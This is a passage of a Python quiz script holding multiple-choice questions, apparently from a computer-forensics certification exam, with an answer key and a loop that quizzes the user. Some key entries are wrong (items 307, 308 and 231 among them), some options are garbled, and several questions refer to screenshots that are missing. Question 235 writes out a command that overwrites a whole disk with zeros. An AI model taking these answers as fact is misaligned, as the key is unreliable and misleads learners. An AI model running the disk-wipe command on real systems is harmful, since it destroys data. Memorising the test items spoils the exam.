C. A switched network will not respond to packets sent to the broadcast address
D. Only Unix and Unix-like systems will reply to this scan""",

201 : """
Your company's network just finished going through a SAS 70 audit. This audit reported that overall, your
network is secure, but there are some areas that needs improvement. The major area was SNMP security.
The audit company recommended turning off SNMP, but that is not an option since you have so many
remote nodes to keep track of. What step could you take to help secure SNMP on your network?

A. Block all internal MAC address from using SNMP
B. Block access to UDP port 171
C. Block access to TCP port 171
D. Change the default community string names""",

202 : """
After attending a CEH security seminar, you make a list of changes you would like to perform on your
network to increase its security. One of the first things you change is to switch the RestrictAnonymous

setting from 0 to 1 on your servers. This, as you were told, would prevent anonymous users from
establishing a null session on the server. Using Userinfo tool mentioned at the seminar, you succeed in
establishing a null session with one of the servers. Why is that?

A. RestrictAnonymous must be set to 10"for complete security
B. RestrictAnonymous must be set to 3"for complete security
C. RestrictAnonymous must be set to 2"for complete security
D. There is no way to always prevent an anonymous null session from establishing""",

203 : """
In a virtual test environment, Michael is testing the strength and security of BGP using multiple routers to
mimic the backbone of the Internet. This project will help him write his doctoral thesis on "bringing down the
Internet". Without sniffing the traffic between the routers, Michael sends millions of RESET packets to the
routers in an attempt to shut one or all of them down. After a few hours, one of the routers finally shuts itself
down. What will the other routers communicate between themselves?

A. The change in the routing fabric to bypass the affected router
B. More RESET packets to the affected router to get it to power back up
C. RESTART packets to the affected router to get it to power back up
D. STOP packets to all other routers warning of where the attack originated""",

204 : """
How many possible sequence number combinations are there in TCP/IP protocol?

A. 1 billion
B. 320 billion
C. 4 billion
D. 32 million""",

205 : """
Tyler is setting up a wireless network for his business that he runs out of his home. He has followed all the
directions from the ISP as well as the wireless router manual. He does not have any encryption set and the
SSID is being broadcast. On his laptop, he can pick up the wireless signal for short periods of time, but
then the connection drops and the signal goes away.
Eventually the wireless signal shows back up, but drops intermittently. What could be Tyler issue with his
home wireless network?

A. Computers on his wired network
B. Satellite television
C. 2.4Ghz Cordless phones
D. CB radio""",

206 : """
If a PDA is seized in an investigation while the device is turned on, what would be the proper procedure?

A. Keep the device powered on
B. Turn off the device immediately
C. Remove the battery immediately
D. Remove any memory cards immediately""",

207 : """
What hashing method is used to password protect Blackberry devices?

A. AES
B. RC5
C. MD5
D. SHA-1""",

208 : """
What layer of the OSI model do TCP and UDP utilize?

A. Data Link
B. Network
C. Transport
D. Session""",

209 : """
When making the preliminary investigations in a sexual harassment case, how many investigators are you
recommended having?

A. One
B. Two
C. Three
D. Four""",

210 : """
What type of equipment would a forensics investigator store in a StrongHold bag?

A. PDAPDA?
B. Backup tapes
C. Hard drives
D. Wireless cards""",

211 : """
If you are concerned about a high level of compression but not concerned about any possible data loss,
what type of compression would you use?

A. Lossful compression
B. Lossy compression
C. Lossless compression
D. Time-loss compression""",

212 : """
When marking evidence that has been collected with the aa/ddmmyy/nnnn/zz format, what does the nnn
denote?

A. The year the evidence was taken
B. The sequence number for the parts of the same exhibit
C. The initials of the forensics analyst
D. The sequential number of the exhibits seized""",

213 : """

An investigator is searching through the firewall logs of a company and notices ICMP packets that are
larger than 65,536 bytes. What type of activity is the investigator seeing?

A. Smurf
B. Ping of death
C. Fraggle
D. Nmap scan""",

214 : """
When carrying out a forensics investigation, why should you never delete a partition on a dynamic disk?

A. All virtual memory will be deleted
B. The wrong partition may be set to active
C. This action can corrupt the disk
D. The computer will be set in a constant reboot state""",

215 : """
When using an iPod and the host computer is running Windows, what file system will be used?

A. iPod+
B. HFS
C. FAT16
D. FAT32""",

216 : """
What is one method of bypassing a system BIOS password?

A. Removing the processor
B. Removing the CMOS battery
C. Remove all the system memory
D. Login to Windows and disable the BIOS password""",

217 : """
What technique used by Encase makes it virtually impossible to tamper with evidence once it has been
acquired?

A. Every byte of the file(s) is given an MD5 hash to match against a master file
B. Every byte of the file(s) is verified using 32-bit CRC
C. Every byte of the file(s) is copied to three different hard drives
D. Every byte of the file(s) is encrypted using three different methods""",

218 : """
What must an investigator do before disconnecting an iPod from any type of computer?

A. Unmount the iPod
B. Mount the iPod
C. Disjoin the iPod
D. Join the iPod""",

219 : """
The following is a log file screenshot from a default installation of IIS 6.0.

What time standard is used by IIS as seen in the screenshot?

A. UTC
B. GMT
C. TAI
D. UT""",

220 : """
A small law firm located in the Midwest has possibly been breached by a computer hacker looking to obtain
information on their clientele. The law firm does not have any on-site IT employees, but wants to search for
evidence of the breach themselves to prevent any possible media attention. Why would this not be
recommended?

A. Searching for evidence themselves would not have any ill effects
B. Searching could possibly crash the machine or device
C. Searching creates cache files, which would hinder the investigation
D. Searching can change date/time stamps""",

221 : """
In the following directory listing,

Which file should be used to restore archived email messages for someone using Microsoft Outlook?

A. Outlook bak
B. Outlook ost
C. Outlook NK2
D. Outlook pst""",

222 : """
Daryl, a computer forensics investigator, has just arrived at the house of an alleged computer hacker. Daryl
takes pictures and tags all computer and peripheral equipment found in the house. Daryl packs all the
items found in his van and takes them back to his lab for further examination. At his lab, Michael his
assistant helps him with the investigation. Since Michael is still in training, Daryl supervises all of his work
very carefully. Michael is not quite sure about the procedures to copy all the data off the computer and
peripheral devices. How many data acquisition tools should Michael use when creating copies of the
evidence for the investigation?

A. Two
B. One
C. Three
D. Four""",

223 : """
What feature of Decryption Collection allows an investigator to crack a password as quickly as possible?

A. Cracks every password in 10 minutes
B. Distribute processing over 16 or fewer computers
C. Support for Encrypted File System
D. Support for MD5 hash verification""",

224 : """
Heather, a computer forensics investigator, is assisting a group of investigators working on a large
computer fraud case involving over 20 people. These 20 people, working in different offices, allegedly
siphoned off money from many different client accounts. Heather responsibility is to find out how the
accused people communicated between each other. She has searched their email and their computers and
has not found any useful evidence. Heather then finds some possibly useful evidence under the desk of
one of the accused.
In an envelope she finds a piece of plastic with numerous holes cut out of it. Heather then finds the same
exact piece of plastic with holes at many of the other accused peoples desks. Heather believes that the 20
people involved in the case were using a cipher to send secret messages in between each other. What

type of cipher was used by the accused in this case?

A. Grill cipher
B. Null cipher
C. Text semagram
D. Visual semagram""",

225 : """
What is the smallest physical storage unit on a hard drive?

A. Track
B. Cluster
C. Sector
D. Platter""",

226 : """
When needing to search for a website that is no longer present on the Internet today but was online few
years back, what site can be used to view the website collection of pages?

A. Proxify.net
B. Dnsstuff.com
C. Samspade.org
D. Archive.org""",

227 : """
Under confession, an accused criminal admitted to encrypting child pornography pictures and then hiding
them within other pictures. What technique did the accused criminal employ?

A. Typography
B. Steganalysis
C. Picture encoding
D. Steganography""",

228 : """
Where does Encase search to recover NTFS files and folders?

A. MBR
B. MFT
C. Slack space
D. HAL""",

229 : """
Given the drive dimensions as follows and assuming a sector has 512 bytes, what is the capacity of the
described hard drive?
22,164 cylinders/disk
80 heads/cylinder
63 sectors/track

A. 53.26 GB
B. 57.19 GB
C. 11.17 GB
D. 10 GB""",

230 : """
Travis, a computer forensics investigator, is finishing up a case he has been working on for over a month
involving copyright infringement and embezzlement. His last task is to prepare an investigative report for
the president of the company he has been working for. Travis must submit a hard copy and an electronic
copy to this president. In what electronic format should Travis send this report?

A. TIFF-8
B. DOC
C. WPD
D. PDF""",

231 : """
A forensics investigator is searching the hard drive of a computer for files that were recently moved to the
Recycle Bin. He searches for files in C:\RECYCLED using a command line tool but does not find anything.
What is the reason for this?

A. He should search in C:\Windows\System32\RECYCLED folder
B. The Recycle Bin does not exist on the hard drive
C. The files are hidden and he must use switch to view them
D. Only FAT system contains RECYCLED folder and not NTFS""",

232 : """
Why should you never power on a computer that you need to acquire digital evidence from?

A. When the computer boots up, files are written to the computer rendering the data nclean
B. When the computer boots up, the system cache is cleared which could destroy evidence
C. When the computer boots up, data in the memory buffer is cleared which could destroy evidence
D. Powering on a computer has no affect when needing to acquire digital evidence from it""",

233 : """
What is the slave device connected to the secondary IDE controller on a Linux OS referred to?

A. hda
B. hdd
C. hdb
D. hdc""",

234 : """
What will the following command accomplish?
dd if=/dev/xxx of=mbr.backup bs=512 count=1

A. Back up the master boot record
B. Restore the master boot record
C. Mount the master boot record on the first partition of the hard drive
D. Restore the first 512 bytes of the first partition of the hard drive""",

235 : """
Preparing an image drive to copy files to is the first step in Linux forensics. For this purpose, what would
the following command accomplish?
dcfldd if=/dev/zero of=/dev/hda bs=4096 conv=noerror, sync

A. Fill the disk with zeros
B. Low-level format
C. Fill the disk with 4096 zeros
D. Copy files from the master disk to the slave disk on the secondary IDE controller""",

236 : """
A picture file is recovered from a computer under investigation. During the investigation process, the file is
enlarged 500% to get a better view of its contents. The picture quality is not degraded at all from this
process. What kind of picture is this file. What kind of picture is this file?

A. Raster image
B. Vector image
C. Metafile image
D. Catalog image""",

237 : """
What advantage does the tool Evidor have over the built-in Windows search?

A. It can find deleted files even after they have been physically removed
B. It can find bad sectors on the hard drive
C. It can search slack space
D. It can find files hidden within ADS""",

238 : """
An on-site incident response team is called to investigate an alleged case of computer tampering within
their company. Before proceeding with the investigation, the CEO informs them that the incident will be
classified as low level. How long will the team have to respond to the incident?

A. One working day
B. Two working days
C. Immediately
D. Four hours
""",

239 : """
What type of attack sends SYN requests to a target system with spoofed IP addresses?

A. SYN flood
B. Ping of death
C. Cross site scripting
D. Land""",

240 : """
Harold is a computer forensics investigator working for a consulting firm out of Atlanta GeorgiA. Harold is
called upon to help with a corporate espionage case in Miami FloridA. Harold assists in the investigation by
pulling all the data from the computers allegedly used in the illegal activities. He finds that two suspects in
the company where stealing sensitive corporate information and selling it to competing companies. From
the email and instant messenger logs recovered, Harold has discovered that the two employees notified
the buyers by writing symbols on the back of specific stop signs. This way, the buyers knew when and
where to meet with the alleged suspects to buy the stolen material. What type of steganography did these
two suspects use?

A. Text semagram
B. Visual semagram
C. Grill cipher
D. Visual cipher""",

241 : """
What is the CIDR from the following screenshot?

A. /24A./24A./24
B. /32 B./32 B./32
C. /16 C./16 C./16
D. /8D./8D./8""",

242 : """
How many times can data be written to a DVD+R disk?

A. Twice
B. Once
C. Zero
D. Infinite""",

243 : """
What must be obtained before an investigation is carried out at a location?

A. Search warrant
B. Subpoena
C. Habeas corpus
D. Modus operandi""",

244 : """
Paul is a computer forensics investigator working for Tyler & Company Consultants. Paul has been called
upon to help investigate a computer hacking ring broken up by the local police. Paul begins to inventory the
PCs found in the hackers hideout. Paul then comes across a PDA left by them that is attached to a number
of different peripheral devices. What is the first step that Paul must take with the PDA to ensure the
integrity of the investigation?

A. Place PDA, including all devices, in an antistatic bag
B. Unplug all connected devices
C. Power off all devices if currently on
D. Photograph and document the peripheral devices""",

245 : """
During an investigation, an employee was found to have deleted harassing emails that were sent to
someone else. The company was using Microsoft Exchange and had message tracking enabled. Where
could the investigator search to find the message tracking log file on the Exchange server?

A. C:\Program Files\Exchsrvr\servername.log
B. D:\Exchsrvr\Message Tracking\servername.log
C. C:\Exchsrvr\Message Tracking\servername.log
D. C:\Program Files\Microsoft Exchange\srvr\servername.log""",

246 : """
Paraben Lockdown device uses which operating system to write hard drive data?

A. Mac OS
B. Red Hat
C. Unix
D. Windows""",

247 : """
What technique is used by JPEGs for compression?

A. ZIP
B. TCD
C. DCT
D. TIFF-8""",

248 : """
John is working as a computer forensics investigator for a consulting firm in CanadA. He is called to seize a
computer at a local web caf purportedly used as a botnet server. John thoroughly scans the computer and
finds nothing that would lead him to think the computer was a botnet server. John decides to scan the
virtual memory of the computer to possibly find something he had missed. What information will the virtual
memory scan produce?

A. It contains the times and dates of when the system was last patched
B. It is not necessary to scan the virtual memory of a computer
C. It contains the times and dates of all the system files
D. Hidden running processes""",

249 : """
What method of copying should always be performed first before carrying out an investigation?

A. Parity-bit copy
B. Bit-stream copy
C. MS-DOS disc copy
D. System level copy""",

250 : """
Where is the default location for Apache access logs on a Linux computer?

A. usr/local/apache/logs/access_log
B. bin/local/home/apache/logs/access_log
C. usr/logs/access_log
D. logs/usr/apache/access_log""",

251 : """
Jacob is a computer forensics investigator with over 10 years experience in investigations and has written
over 50 articles on computer forensics. He has been called upon as a qualified witness to testify the
accuracy and integrity of the technical log files gathered in an investigation into computer fraud. What is the
term used for Jacob testimony in this case?

A. Justification
B. Authentication
C. Reiteration
D. Certification""",

252 : """
How often must a company keep log files for them to be admissible in a court of law?

A. All log files are admissible in court no matter their frequency
B. Weekly
C. Monthly
D. Continuously""",

253 : """
What file is processed at the end of a Windows XP boot to initialize the logon dialog box?

A. NTOSKRNL.EXE
B. NTLDR
C. LSASS.EXE
D. NTDETECT.COM""",

254 : """
John is working on his company policies and guidelines. The section he is currently working on covers
company documents; how they should be handled, stored, and eventually destroyed. John is concerned
about the process whereby outdated documents are destroyed. What type of shredder should John write in
the guidelines to be used when destroying documents?

A. Strip-cut shredder
B. Cross-cut shredder
C. Cross-hatch shredder
D. Cris-cross shredder""",

255 : """
To check for POP3 traffic using Ethereal, what port should an investigator search by?

A. 143
B. 25
C. 110
D. 125""",

256 : """
When should an MD5 hash check be performed when processing evidence?

A. After the evidence examination has been completed
B. On an hourly basis during the evidence examination
C. Before and after evidence examination
D. Before the evidence examination has been completed""",

257 : """
At what layer does a cross site scripting attack occur on?

A. Presentation
B. Application
C. Session
D. Data Link
""",

258 : """
Davidson Trucking is a small transportation company that has three local offices in Detroit Michigan. Ten
female employees that work for the company have gone to an attorney reporting that male employees
repeatedly harassed them and that management did nothing to stop the problem. Davidson has employee
policies that outline all company guidelines, including awareness on harassment and how it will not be
tolerated. When the case is brought to court, whom should the prosecuting attorney call upon for not
upholding company policy?

A. IT personnel
B. Employees themselves
C. Supervisors
D. Administrative assistant in charge of writing policies""",

259 : """
When searching through file headers for picture file formats, what should be searched to find a JPEG file in
hexadecimal format?

A. FF D8 FF E0 00 10
B. FF FF FF FF FF FF
C. FF 00 FF 00 FF 00
D. EF 00 EF 00 EF 00""",

260 : """
Jack Smith is a forensics investigator who works for Mason Computer Investigation Services. He is
investigating a computer that was infected by Ramen Virus.

He runs the netstat command on the machine to see its current connections. In the following screenshot,
what do the 0.0.0.0 IP addresses signify?

A. Those connections are established
B. Those connections are in listening mode
C. Those connections are in closed/waiting mode
D. Those connections are in timed out/waiting mode""",

261 : """
What type of flash memory card comes in either Type I or Type II and consumes only five percent of the
power required by small hard drives?

A. SD memory
B. CF memory
C. MMC memory
D. SM memory""",

262 : """
Julie is a college student majoring in Information Systems and Computer Science. She is currently writing
an essay for her computer crimes class. Julie paper focuses on white-collar crimes in America and how
forensics investigators investigate the cases. Julie would like to focus the subject. Julie would like to focus
the subject of the essay on the most common type of crime found in corporate AmericA. What crime should
Julie focus on?

A. Physical theft
B. Copyright infringement
C. Industrial espionage
D. Denial of Service attacks""",

263 : """
A forensics investigator needs to copy data from a computer to some type of removable media so he can
examine the information at another location. The problem is that the data is around 42GB in size. What
type of removable media could the investigator use?

A. Blu-Ray single-layer
B. HD-DVD
C. Blu-Ray dual-layer
D. DVD-18""",

264 : """
Steven has been given the task of designing a computer forensics lab for the company he works for. He
has found documentation on all aspects of how to design a lab except the number of exits needed. How
many exits should Steven include in his design for the computer forensics lab?

A. Three
B. One
C. Two
D. Four""",

265 : """
You have been called in to help with an investigation of an alleged network intrusion. After "ing the
members of the company IT department, you search through the server log files to find any trace of the
intrusion. After that you decide to telnet into one of the company routers to see if there is any evidence to
be found. While connected to the router, you see some unusual activity and believe that the attackers are
currently connected to that router. You start up an ethereal session to begin capturing traffic on the router
that could be used in the investigation. At what layer of the OSI model are you monitoring while watching
traffic to and from the router?

A. Network
B. Transport
C. Data Link
D. Session""",

266 : """
Which forensic investigating concept trails the whole incident from how the attack began to how the victim
was affected?

A. Point-to-point
B. End-to-end
C. Thorough
D. Complete event analysis""",

267 : """
Sniffers that place NICs in promiscuous mode work at what layer of the OSI model?

A. Network
B. Transport
C. Physical
D. Data Link""",

268 : """
Where are files temporarily written in Unix when printing?

A. /usr/spool
B. /var/print
C. /spool
D. /var/spool""",

269 : """
All Blackberry email is eventually sent and received through what proprietary RIM-operated mechanism?

A. Blackberry Message Center
B. Microsoft Exchange
C. Blackberry WAP gateway
D. Blackberry WEP gateway""",

270 : """
Which program is the bootloader when Windows XP starts up?

A. KERNEL.EXE
B. NTLDR
C. LOADER
D. LILO""",

271 : """
What encryption technology is used on Blackberry devices Password Keeper?

A. 3DES
B. AES
C. Blowfish
D. RC5""",

272 : """
What is the first step taken in an investigation for laboratory forensic staff members?

A. Packaging the electronic evidence
B. Securing and evaluating the electronic crime scene
C. Conducting preliminary interviews
D. Transporting the electronic evidence""",

273 : """
What type of analysis helps to identify the time and sequence of events in an investigation?

A. Time-based
B. Functional
C. Relational
D. Temporal""",

274 : """
Cylie is investigating a network breach at a state organization in FloridA. She discovers that the intruders
were able to gain access into the company firewalls by overloading them with IP packets. Cylie then
discovers through her investigation that the intruders hacked into the company phone system and used the
hard drives on their PBX system to store shared music files. What would this attack on the company PBX
system be called?

A. Phreaking
B. Squatting
C. Crunching
D. Pretexting""",

275 : """
What will the following command accomplish in Linux?
fdisk /dev/hda

A. Partition the hard drive
B. Format the hard drive
C. Delete all files under the /dev/hda folder
D. Fill the disk with zeros
""",

276 : """
In the following email header, where did the email first originate from?

A. Somedomain.com
B. Smtp1.somedomain.com
C. Simon1.state.ok.gov.us
D. David1.state.ok.gov.us""",


277 : """
A computer forensics investigator is inspecting the firewall logs for a large financial institution that has
employees working 24 hours a day, 7 days a week.

What can the investigator infer from the screenshot seen below?

A. A smurf attack has been attempted
B. A denial of service has been attempted
C. Network intrusion has occurred
D. Buffer overflow attempt on the firewall.""",

278 : """
When investigating a wireless attack, what information can be obtained from the DHCP logs?

A. The operating system of the attacker and victim computers
B. IP traffic between the attacker and the victim
C. MAC address of the attacker
D. If any computers on the network are running in promiscuous mode""",

279 : """
This type of testimony is presented by someone who does the actual fieldwork and does not offer a view in
court.

A. Civil litigation testimony
B. Expert testimony
C. Victim advocate testimony
D. Technical testimony
""",

280 : """
On an Active Directory network using NTLM authentication, where on the domain controllers are the
passwords stored?

A. SAM
B. AMS
C. Shadow file
D. Password.conf""",

281 : """
Why is it still possible to recover files that have been emptied from the Recycle Bin on a Windows
computer?

A. The data is still present until the original location of the file is used
B. The data is moved to the Restore directory and is kept there indefinitely
C. The data will reside in the L2 cache on a Windows computer until it is manually deleted
D. It is not possible to recover data that has been emptied from the Recycle Bin""",

282 : """
When is it appropriate to use computer forensics?

A. If copyright and intellectual property theft/misuse has occurred
B. If employees do not care for their boss management techniques
C. If sales drop off for no apparent reason for an extended period of time
D. If a financial institution is burglarized by robbers""",

283 : """
Madison is on trial for allegedly breaking into her university internal network. The police raided her dorm
room and seized all of her computer equipment. Madison lawyer is trying to convince the judge that the
seizure was unfounded and baseless. Under which US Amendment is Madison lawyer trying to prove the
police violated?

A. The 10th Amendment
B. The 5th Amendment
C. The 1st Amendment
D. The 4th Amendment""",

284 : """
Using Linux to carry out a forensics investigation, what would the following command accomplish?
dd if=/usr/home/partition.image of=/dev/sdb2 bs=4096 conv=notrunc,noerror

A. Search for disk errors within an image file
B. Backup a disk to an image file
C. Copy a partition to an image file
D. Restore a disk from an image file""",

285 : """
In handling computer-related incidents, which IT role should be responsible for recovery, containment, and
prevention to constituents?

A. Security Administrator
B. Network Administrator
C. Director of Information Technology
D. Director of Administration""",


286 : """
What will the following Linux command accomplish?
dd if=/dev/mem of=/home/sam/mem.bin bs=1024

A. Copy the master boot record to a file
B. Copy the contents of the system folder to a file
C. Copy the running memory to a file
D. Copy the memory dump file to an image file""",

287 : """
Before performing a logical or physical search of a drive in Encase, what must be added to the program?

A. File signatures
B. Keywords
C. Hash sets
D. Bookmarks""",

288 : """
When a router receives an update for its routing table, what is the metric value change to that path?

A. Increased by 2
B. Decreased by 1
C. Increased by 1
D. Decreased by 2""",

289 : """
When operating systems mark a cluster as used but not allocated, the cluster is considered as _________

A. Corrupt
B. Bad
C. Lost
D. Unallocated""",

290 : """
While looking through the IIS log file of a web server, you find the following entries:

What is evident from this log file?

A. Web bugs
B. Cross site scripting
C. Hidden fields
D. SQL injection is possible""",

291 : """
Why would you need to find out the gateway of a device when investigating a wireless attack?

A. The gateway will be the IP of the proxy server used by the attacker to launch the attack
B. The gateway will be the IP of the attacker computer
C. The gateway will be the IP used to manage the RADIUS server
D. The gateway will be the IP used to manage the access point""",

292 : """
Using Internet logging software to investigate a case of malicious use of computers, the investigator comes
across some entries that appear odd.

From the log, the investigator can see where the person in "went on the Internet. From the log, it
appears that the user was manually typing in different user ID numbers. What technique this user was
trying?

A. Parameter tampering
B. Cross site scripting
C. SQL injection
D. Cookie Poisoning""",

293 : """
Why would a company issue a dongle with the software they sell?

A. To provide source code protection
B. To provide wireless functionality with the software
C. To provide copyright protection
D. To ensure that keyloggers cannot be used""",

294 : """
What feature of Windows is the following command trying to utilize?

A. White space
B. AFS
C. ADS
D. Slack file""",

295 : """
Harold is finishing up a report on a case of network intrusion, corporate spying, and embezzlement that he
has been working on for over six months. He is trying to find the right term to use in his report to describe
network-enabled spying. What term should Harold use?

A. Spycrack
B. Spynet
C. Netspionage
D. Hackspionage""",

296 : """
What is considered a grant of a property right given to an individual who discovers or invents a new
machine, process, useful composition of matter or manufacture?

A. Copyright
B. Design patent
C. Trademark
D. Utility patent""",

297 : """
Where is the startup configuration located on a router?

A. Static RAM
B. BootROM
C. NVRAM
D. Dynamic RAM""",

298 : """
While searching through a computer under investigation, you discover numerous files that appear to have
had the first letter of the file name replaced by the hex code byte 5h. What does this indicate on the
computer?

A. The files have been marked as hidden
B. The files have been marked for deletion
C. The files are corrupt and cannot be recovered
D. The files have been marked as read-only""",

299 : """
While presenting his case to the court, Simon calls many witnesses to the stand to testify. Simon decides
to call Hillary Taft, a lay witness, to the stand. Since Hillary is a lay witness, what field would she be
considered an expert in?

A. Technical material related to forensics
B. No particular field
C. Judging the character of defendants/victims
D. Legal issues""",

300 : """
When reviewing web logs, you see an entry for resource not found in the HTTP status code field.
What is the actual error code that you would see in the log for resource not found?

A. 202
B. 404
C. 606
D. 999""",

301 : """
What stage of the incident handling process involves reporting events?

A. Containment
B. Follow-up
C. Identification
D. Recovery""",

302 : """
When investigating a computer forensics case where Microsoft Exchange and Blackberry Enterprise server
are used, where would investigator need to search to find email sent from a Blackberry device?

A. RIM Messaging center
B. Blackberry Enterprise server
C. Microsoft Exchange server
D. Blackberry desktop redirector""",

303 : """
What type of attack sends spoofed UDP packets (instead of ping packets) with a fake source address to
the IP broadcast address of a large network?

A. Fraggle
B. Smurf scan
C. SYN flood
D. Teardrop""",

304 : """
Which of the following is a list of recently used programs or opened files?

A. Most Recently Used (MRU)
B. Recently Used Programs (RUP)
C. Master File Table (MFT)
D. GUID Partition Table (GPT)""",

305 : """
Which of the following tasks DOES NOT come under the investigation phase of a cybercrime forensics
investigation case?

A. Data collection
B. Secure the evidence
C. First response
D. Data analysis""",

306 : """
Which of the following techniques delete the files permanently?

A. Trail obfuscation
B. Data Hiding
C. Steganography
D. Artifact Wiping""",

307 : """
Which of the following file contains the traces of the applications installed, run, or uninstalled from a
system?

A. Shortcut Files
B. Virtual files
C. Prefetch Files
D. Image Files""",

308 : """
Which password cracking technique uses details such as length of password, character sets used to
construct the password, etc.?

A. Dictionary attack
B. Brute force attack
C. Rule-based attack
D. Man in the middle attack""",

309 : """
Which US law does the interstate or international transportation and receiving of child pornography fall
under?

A. §18. U.S.C. 1466A
B. §18. U.S.C 252
C. §18. U.S.C 146A
D. §18. U.S.C 2252""",

310 : """
Which network attack is described by the following statement?
“At least five Russian major banks came under a continuous hacker attack, although online client services
were not disrupted. The attack came from a wide-scale botnet involving at least 24,000 computers, located
in 30 countries.”

A. DDoS
B. Sniffer Attack
C. Buffer Overflow
D. Man-in-the-Middle Attack
""",

311 : """
Which of the following tool captures and allows you to interactively browse the traffic on a network?

A. Security Task Manager
B. Wireshark
C. ThumbsDisplay
D. RegScanner""",

312 : """
Which of the following standard represents a legal precedent sent in 1993 by the Supreme Court of the
United States regarding the admissibility of expert witnesses’ testimony during federal legal proceedings?

A. IOCE
B. SWGDE & SWGIT
C. Frye
D. Daubert""",

313 : """
Which of the following stages in a Linux boot process involve initialization of the system’s hardware?

A. BIOS Stage
B. Bootloader Stage
C. BootROM Stage
D. Kernel Stage""",

314 : """
Who is responsible for the following tasks?
Secure the scene and ensure that is maintained in a secure state until the Forensic Team advises
Make notes about the scene that will eventually be handed over to the Forensic Team

A. Non-forensics staff
B. Lawyers
C. System administrators
D. Local managers or other non-forensic staff""",

315 : """
Wireless access control attacks aim to penetrate a network by evading WLAN access control measures
such as AP MAC filters and Wi-Fi port access controls. Which of the following wireless access control
attacks allow the attacker to set up a rogue access point outside the corporate perimeter and then lure the
employees of the organization to connect to it?

A. Ad hoc associations
B. Client mis-association
C. MAC spoofing
D. Rogue access points""",

316 : """
You have been given the task to investigate web attacks on a Windows-based server. Which of the
following commands will you use to look at the sessions the machine has opened with other systems?

A. Net sessions
B. Net config
C. Net share
D. Net use"""}


answers={1:"D",2:"C",3:"C",4:"C",5:"A",6:"B",7:"A",8:"B",9:"D",10:"C",11:"A",12:"D",13:"B",14:"D",15:"C",16:"A",17:"B",18:"B",19:"C",20:"A",21:"A",22:"A",23:"D",24:"D",25:"B",26:"D",27:"B",28:"D",29:"A",30:"ACDE",31:"D",32:"C",33:"A",34:"A",35:"B",36:"A",37:"A",38:"A",39:"A",40:"C",41:"C",42:"C",43:"A",44:"A",45:"D",46:"C",47:"C",48:"C",49:"A",50:"C",51:"B",52:"B",53:"A",54:"B",55:"B",56:"B",57:"B",58:"B",59:"A",60:"B",61:"C",62:"D",63:"A",64:"C",65:"B",66:"B",67:"B",68:"B",69:"A",70:"C",71:"C",72:"C",73:"A",74:"C",75:"D",76:"A",77:"C",78:"C",79:"B",80:"D",81:"A",82:"D",83:"C",84:"A",85:"B",86:"B",87:"A",88:"B",89:"B",90:"C",91:"B",92:"C",93:"A",94:"D",95:"C",96:"C",97:"B",98:"D",99:"A",100:"A",101:"B",102:"C",103:"A",104:"B",105:"C",106:"D",107:"C",108:"A",109:"B",110:"D",111:"C",112:"B",113:"C",114:"A",115:"D",116:"A",117:"A",118:"C",119:"C",120:"C",121:"A",122:"B",123:"B",124:"B",125:"B",126:"B",127:"A",128:"A",129:"C",130:"D",131:"A",132:"D",133:"D",134:"B",135:"B",136:"C",137:"A",138:"AB",139:"A",140:"D",141:"B",142:"D",143:"D",144:"C",145:"A",146:"A",147:"A",148:"B",149:"B",150:"A",151:"A",152:"A",153:"D",154:"A",155:"C",156:"D",157:"B",158:"A",159:"B",160:"C",161:"D",162:"B",163:"A",164:"A",165:"B",166:"C",167:"B",168:"A",169:"D",170:"A",171:"B",172:"C",173:"A",174:"D",175:"D",176:"D",177:"D",178:"D",179:"A",180:"D",181:"A",182:"A",183:"C",184:"A",185:"B",186:"B",187:"B",188:"C",189:"A",190:"A",191:"B",192:"A",193:"C",194:"C",195:"D",196:"C",197:"A",198:"B",199:"A",200:"D",201:"D",202:"C",203:"A",204:"C",205:"C",206:"A",207:"D",208:"C",209:"B",210:"D",211:"B",212:"D",213:"B",214:"C",215:"D",216:"B",217:"B",218:"A",219:"A",220:"D",221:"D",222:"A",223:"B",224:"A",225:"C",226:"D",227:"D",228:"B",229:"A",230:"D",231:"C",232:"A",233:"B",234:"A",235:"A",236:"B",237:"C",238:"A",239:"A",240:"B",241:"D",242:"B",243:"A",244:"D",245:"A",246:"D",247:"C",248:"D",249:"B",250:"A",251:"B",252:"D",253:"A",254:"B",255:"C",256:"C",257:"B",258:"C",259:"A",260:"B",261:"B",262:"C",263:"C",264:"B",265:"A",266:"B",267:"C",268:"D",269:"A",270:"B",271:"B",272:"B",273:"D",274:"A",275:"A",276:"C",277:"C",278:"C",279:"D",280:"A",281:"A",282:"A",283:"D",284:"D",285:"B",286:"C",287:"B",288:"C",289:"C",290:"D",291:"D",292:"A",293:"C",294:"C",295:"C",296:"D",297:"C",298:"B",299:"B",300:"B",301:"C",302:"C",303:"A",304:"A",305:"C",306:"D",307:"A",308:"A",309:"D",310:"A",311:"B",312:"D",313:"A",314:"A",315:"B",316:"D"}


raw_input("[=] Press enter to start")
while True:
    q = random.randint(1,316)
    print(questions[q] + "\n")
    a = raw_input("Answer: ")
    if a.upper() in answers[q]:
        print("[+] Correct Answer, Good! \n")
    else:
        print("[-] Wrong Answer =( The right answer is the altrenative " + answers[q] + "\n")
